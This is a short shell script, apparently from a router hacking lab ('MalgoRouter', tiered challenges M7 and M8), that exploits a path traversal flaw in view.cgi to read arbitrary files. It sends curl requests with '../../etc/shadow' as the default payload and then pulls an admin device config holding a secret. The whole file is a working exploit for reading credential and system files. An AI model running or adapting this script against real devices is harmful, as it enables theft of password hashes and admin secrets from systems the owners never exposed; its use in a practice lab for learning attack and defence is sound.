#!/bin/sh
# M7 - view.cgi path traversal (arbitrary file read). Low tier = no filtering.
: "${TARGET:?set TARGET to the MalgoRouter IP}"
FILE="${1:-../../etc/shadow}"
echo "[*] GET view.cgi?file=$FILE"
curl -s --max-time 15 "http://$TARGET/cgi-bin/view.cgi?file=$FILE"
echo
echo "--- admin device config (M8 secret) ---"
curl -s --max-time 15 "http://$TARGET/cgi-bin/view.cgi?file=../../etc/device.conf"
